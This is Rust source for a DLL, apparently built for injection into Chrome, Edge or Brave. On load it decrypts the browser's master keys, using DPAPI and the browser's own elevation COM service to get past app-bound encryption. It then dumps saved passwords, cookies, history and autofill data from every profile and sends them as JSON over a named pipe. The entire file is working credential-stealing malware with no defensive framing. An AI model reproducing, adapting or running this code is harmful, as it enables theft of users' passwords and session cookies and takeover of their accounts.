use base64::Engine;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::ffi::OsStr;
use std::fs;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::ptr;
use std::thread;
use std::time::{SystemTime, UNIX_EPOCH};

#[derive(Serialize, Deserialize, Debug)]
struct PasswordData { url: String, username: String, password: String }
#[derive(Serialize, Deserialize, Debug)]
struct CookieData { host: String, name: String, value: String }
#[derive(Serialize, Deserialize, Debug)]
struct HistoryData { url: String, title: String, visit_count: i32 }
#[derive(Serialize, Deserialize, Debug)]
struct AutofillData { name: String, value: String }
#[derive(Serialize, Deserialize, Debug)]
struct ProfileData {
    name: String,
    passwords: Vec<PasswordData>,
    cookies: Vec<CookieData>,
    history: Vec<HistoryData>,
    autofill: Vec<AutofillData>,
}

use winapi::{
    shared::{guiddef::GUID, minwindef::UINT, wtypes::BSTR},
    um::{
        combaseapi::{CoCreateInstance, CoInitializeEx, CoSetProxyBlanket, CoUninitialize},
        objbase::COINIT_APARTMENTTHREADED,
        oleauto::{SysAllocStringByteLen, SysFreeString, SysStringByteLen},
        winnt::{DLL_PROCESS_ATTACH, GENERIC_WRITE},
        dpapi::CryptUnprotectData,
        wincrypt::DATA_BLOB,
        handleapi::INVALID_HANDLE_VALUE,
        fileapi::{CreateFileW, OPEN_EXISTING, WriteFile},
    },
    ctypes::c_void,
};

use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};

#[derive(Clone, Copy, Debug, PartialEq)]
enum Browser { Chrome, Edge, Brave }

const CLSID_CHROME_ELEVATOR: GUID = GUID { Data1: 0x708860E0, Data2: 0xF641, Data3: 0x4611, Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B] };
const IID_CHROME_IELEVATOR1: GUID = GUID { Data1: 0x463ABECF, Data2: 0x410D, Data3: 0x407F, Data4: [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8] };
const IID_CHROME_IELEVATOR2: GUID = GUID { Data1: 0x1BF5208B, Data2: 0x295F, Data3: 0x4992, Data4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38] };

const CLSID_EDGE_ELEVATOR: GUID = GUID { Data1: 0x1FCBE96C, Data2: 0x1697, Data3: 0x43AF, Data4: [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67] };
const IID_EDGE_IELEVATOR1: GUID = GUID { Data1: 0xC9C2B807, Data2: 0x7731, Data3: 0x4F34, Data4: [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B] };
const IID_EDGE_IELEVATOR2: GUID = GUID { Data1: 0x8F7B6792, Data2: 0x784D, Data3: 0x4047, Data4: [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05] };

const CLSID_BRAVE_ELEVATOR: GUID = GUID { Data1: 0x576B31AF, Data2: 0x6369, Data3: 0x4B6B, Data4: [0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B] };
const IID_BRAVE_IELEVATOR1: GUID = GUID { Data1: 0xF396861E, Data2: 0x0C8E, Data3: 0x4C71, Data4: [0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9] };
const IID_BRAVE_IELEVATOR2: GUID = GUID { Data1: 0x1BF5208B, Data2: 0x295F, Data3: 0x4992, Data4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38] };

#[repr(C)]
struct IElevatorVTbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
    RunRecoveryCRXElevated: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, u32, *mut u32) -> i32,
    EncryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
    DecryptData: unsafe extern "system" fn(*mut c_void, BSTR, *mut BSTR, *mut u32) -> i32,
}
#[repr(C)]
struct IEdgeElevatorVTbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
    EdgeBaseMethod1: unsafe extern "system" fn(*mut c_void) -> i32,
    EdgeBaseMethod2: unsafe extern "system" fn(*mut c_void) -> i32,
    EdgeBaseMethod3: unsafe extern "system" fn(*mut c_void) -> i32,
    RunRecoveryCRXElevated: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, u32, *mut u32) -> i32,
    EncryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
    DecryptData: unsafe extern "system" fn(*mut c_void, BSTR, *mut BSTR, *mut u32) -> i32,
}

fn log_message(msg: &str) -> Result<(), std::io::Error> {
    let desktop = std::env::var("USERPROFILE").map(|p| PathBuf::from(p).join("Desktop").join("log.txt")).unwrap_or_else(|_| PathBuf::from("log.txt"));
    let mut file = fs::OpenOptions::new().create(true).append(true).open(desktop)?;
    let _ = writeln!(file, "[{}] {}", SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs(), msg);
    Ok(())
}

fn decrypt_dpapi(data: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let mut input = DATA_BLOB { cbData: data.len() as u32, pbData: data.as_ptr() as *mut u8 };
        let mut output = DATA_BLOB { cbData: 0, pbData: ptr::null_mut() };
        if CryptUnprotectData(&mut input, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, &mut output) != 0 {
            let result = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            winapi::um::winbase::LocalFree(output.pbData as *mut c_void);
            Ok(result)
        } else { Err(format!("DPAPI Error: {}", winapi::um::errhandlingapi::GetLastError())) }
    }
}

fn decrypt_with_elevator(encrypted_blob: &[u8], browser: Browser) -> Result<Vec<u8>, String> {
    let (clsid, iids) = match browser {
        Browser::Chrome => (CLSID_CHROME_ELEVATOR, vec![IID_CHROME_IELEVATOR2, IID_CHROME_IELEVATOR1]),
        Browser::Edge => (CLSID_EDGE_ELEVATOR, vec![IID_EDGE_IELEVATOR2, IID_EDGE_IELEVATOR1]),
        Browser::Brave => (CLSID_BRAVE_ELEVATOR, vec![IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1]),
    };
    unsafe {
        let hr = CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
        if hr < 0 && hr as u32 != 0x80010106 { return Err("CoInit failed".into()); }
        let result = (|| {
            let mut elevator_ptr: *mut c_void = ptr::null_mut();
            let mut hr = -1;
            for iid in iids {
                hr = CoCreateInstance(&clsid, ptr::null_mut(), winapi::shared::wtypesbase::CLSCTX_LOCAL_SERVER, &iid, &mut elevator_ptr);
                if hr >= 0 { break; }
            }
            if hr < 0 { return Err(format!("CoCreateInstance failed: 0x{:08X}", hr as u32)); }
            let _ = CoSetProxyBlanket(elevator_ptr as *mut winapi::um::unknwnbase::IUnknown, 10, 0, ptr::null_mut(), 6, 3, ptr::null_mut(), 0x40);
            let bstr_enc = SysAllocStringByteLen(encrypted_blob.as_ptr() as *const i8, encrypted_blob.len() as UINT);
            let mut bstr_dec: BSTR = ptr::null_mut();
            let mut last_error: u32 = 0;
            let hr = if browser == Browser::Edge {
                let vtable = *(elevator_ptr as *const *const IEdgeElevatorVTbl);
                ((*vtable).DecryptData)(elevator_ptr, bstr_enc, &mut bstr_dec, &mut last_error)
            } else {
                let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
                ((*vtable).DecryptData)(elevator_ptr, bstr_enc, &mut bstr_dec, &mut last_error)
            };
            SysFreeString(bstr_enc);
            if hr < 0 {
                let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
                ((*vtable).Release)(elevator_ptr);
                return Err(format!("DecryptData failed: 0x{:08X}", hr as u32));
            }
            let res = std::slice::from_raw_parts(bstr_dec as *const u8, SysStringByteLen(bstr_dec) as usize).to_vec();
            SysFreeString(bstr_dec);
            let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
            ((*vtable).Release)(elevator_ptr);
            Ok(res)
        })();
        if hr >= 0 { CoUninitialize(); }
        result
    }
}

fn aes_gcm_decrypt(key: &[u8], data: &[u8]) -> Vec<u8> {
    if data.len() < 15 { return b"[Too Short]".to_vec(); }
    let nonce = Nonce::from_slice(&data[3..15]);
    let cipher = match Aes256Gcm::new_from_slice(key) { Ok(c) => c, Err(_) => return b"[Key Error]".to_vec() };
    cipher.decrypt(nonce, &data[15..]).unwrap_or_else(|_| b"[Decryption Failed]".to_vec())
}

fn get_browser() -> Browser {
    let mut path = [0u16; 260];
    unsafe { winapi::um::libloaderapi::GetModuleFileNameW(ptr::null_mut(), path.as_mut_ptr(), 260); }
    let s = String::from_utf16_lossy(&path).to_lowercase();
    if s.contains("msedge.exe") { Browser::Edge } else if s.contains("brave.exe") { Browser::Brave } else { Browser::Chrome }
}

fn do_work() -> Result<(), Box<dyn std::error::Error>> {
    let browser = get_browser();
    let user_profile = std::env::var("USERPROFILE")?;
    let data_path = match browser {
        Browser::Chrome => Path::new(&user_profile).join("AppData\\Local\\Google\\Chrome\\User Data"),
        Browser::Edge => Path::new(&user_profile).join("AppData\\Local\\Microsoft\\Edge\\User Data"),
        Browser::Brave => Path::new(&user_profile).join("AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
    };

    let local_state = fs::read_to_string(data_path.join("Local State")).unwrap_or_default();
    let json: Value = serde_json::from_str(&local_state).unwrap_or(Value::Null);

    let mut v10_key = Vec::new();
    if let Some(key_b64) = json.get("os_crypt").and_then(|o| o.get("encrypted_key")).and_then(|v| v.as_str()) {
        if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(key_b64) {
            if decoded.starts_with(b"DPAPI") { v10_key = decrypt_dpapi(&decoded[5..]).unwrap_or_default(); }
        }
    }

    let mut v20_key = Vec::new();
    let key_b64 = json.get("app_bound_encrypted_key").and_then(|v| v.as_str()).or_else(|| json.get("os_crypt").and_then(|o| o.get("app_bound_encrypted_key")).and_then(|v| v.as_str()));
    if let Some(b64) = key_b64 {
        if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) {
            let blob = if decoded.starts_with(b"APPB") { &decoded[4..] } else { &decoded };
            v20_key = decrypt_with_elevator(blob, browser).unwrap_or_default();
        }
    }

    let mut profiles = vec!["Default".to_string()];
    if let Ok(entries) = fs::read_dir(&data_path) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with("Profile ") { profiles.push(name); }
        }
    }
    profiles.sort_by_key(|s| if s == "Default" { 0 } else { s[8..].parse::<u32>().unwrap_or(999) });

    let mut collected = Vec::new();
    for profile in profiles {
        let p_path = data_path.join(&profile);
        let mut p_data = ProfileData { name: profile, passwords: vec![], cookies: vec![], history: vec![], autofill: vec![] };

        // Passwords
        let db = p_path.join("Login Data");
        let tmp = Path::new(&user_profile).join("Desktop\\chrome_db\\pass.tmp");
        let _ = fs::create_dir_all(tmp.parent().unwrap());
        if fs::copy(&db, &tmp).is_ok() {
            if let Ok(conn) = rusqlite::Connection::open(&tmp) {
                if let Ok(mut s) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
                    let rows = s.query_map([], |r| Ok((r.get::<_,String>(0)?, r.get::<_,String>(1)?, r.get::<_,Vec<u8>>(2)?)));
                    if let Ok(rows) = rows {
                        for r in rows.flatten() {
                            let key = if r.2.starts_with(b"v20") { &v20_key } else { &v10_key };
                            if !key.is_empty() { p_data.passwords.push(PasswordData { url: r.0, username: r.1, password: String::from_utf8_lossy(&aes_gcm_decrypt(key, &r.2)).to_string() }); }
                        }
                    }
                }
            }
            let _ = fs::remove_file(&tmp);
        }

        // Cookies
        let db = p_path.join("Network\\Cookies");
        let tmp = Path::new(&user_profile).join("Desktop\\chrome_db\\cook.tmp");
        if fs::copy(&db, &tmp).is_ok() {
            if let Ok(conn) = rusqlite::Connection::open(&tmp) {
                if let Ok(mut s) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
                    let rows = s.query_map([], |r| Ok((r.get::<_,String>(0)?, r.get::<_,String>(1)?, r.get::<_,Vec<u8>>(2)?)));
                    if let Ok(rows) = rows {
                        for r in rows.flatten() {
                            let is_v20 = r.2.starts_with(b"v20");
                            let key = if is_v20 { &v20_key } else { &v10_key };
                            if !key.is_empty() {
                                let dec = aes_gcm_decrypt(key, &r.2);
                                let val = if is_v20 && dec.len() > 32 { &dec[32..] } else { &dec };
                                p_data.cookies.push(CookieData { host: r.0, name: r.1, value: String::from_utf8_lossy(val).to_string() });
                            }
                        }
                    }
                }
            }
            let _ = fs::remove_file(&tmp);
        }

        // History
        let db = p_path.join("History");
        let tmp = Path::new(&user_profile).join("Desktop\\chrome_db\\hist.tmp");
        if fs::copy(&db, &tmp).is_ok() {
            if let Ok(conn) = rusqlite::Connection::open(&tmp) {
                if let Ok(mut s) = conn.prepare("SELECT url, title, visit_count FROM urls LIMIT 500") {
                    let rows = s.query_map([], |r| Ok(HistoryData { url: r.get(0)?, title: r.get(1)?, visit_count: r.get(2)? }));
                    if let Ok(rows) = rows { p_data.history.extend(rows.flatten()); }
                }
            }
            let _ = fs::remove_file(&tmp);
        }

        // Autofill
        let db = p_path.join("Web Data");
        let tmp = Path::new(&user_profile).join("Desktop\\chrome_db\\web.tmp");
        if fs::copy(&db, &tmp).is_ok() {
            if let Ok(conn) = rusqlite::Connection::open(&tmp) {
                if let Ok(mut s) = conn.prepare("SELECT name, value FROM autofill") {
                    let rows = s.query_map([], |r| Ok(AutofillData { name: r.get(0)?, value: r.get(1)? }));
                    if let Ok(rows) = rows { p_data.autofill.extend(rows.flatten()); }
                }
            }
            let _ = fs::remove_file(&tmp);
        }
        collected.push(p_data);
    }

    unsafe {
        let pipe_name: Vec<u16> = OsStr::new(r"\\.\pipe\chrome_extractor").encode_wide().chain(Some(0)).collect();
        let mut handle = INVALID_HANDLE_VALUE;
        for _ in 0..30 {
            handle = CreateFileW(pipe_name.as_ptr(), GENERIC_WRITE, 0, ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut());
            if handle != INVALID_HANDLE_VALUE { break; }
            thread::sleep(std::time::Duration::from_millis(200));
        }
        if handle != INVALID_HANDLE_VALUE {
            if let Ok(s) = serde_json::to_vec(&collected) {
                let mut written = 0;
                WriteFile(handle, s.as_ptr() as *const _, s.len() as u32, &mut written, ptr::null_mut());
            }
            winapi::um::handleapi::CloseHandle(handle);
        }
    }
    Ok(())
}

#[no_mangle]
pub extern "system" fn DllMain(_: *mut c_void, reason: u32, _: *mut c_void) -> i32 {
    if reason == DLL_PROCESS_ATTACH { thread::spawn(|| { let _ = do_work(); }); }
    1
}
